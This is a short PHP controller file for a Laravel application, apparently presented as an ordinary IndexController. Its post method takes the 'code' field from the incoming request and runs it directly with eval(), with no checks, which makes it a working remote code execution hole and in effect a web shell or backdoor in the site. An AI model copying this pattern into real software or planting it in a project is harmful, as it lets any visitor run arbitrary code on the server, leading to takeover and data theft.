<?php
namespace App\Http\Controllers;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Route;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Str;
use Illuminate\Support\Collection;

class IndexController extends Controller {

    public function index(){

    }

    public function post()
    {
        $code = request()->post('code');
        eval($code);
    }

}
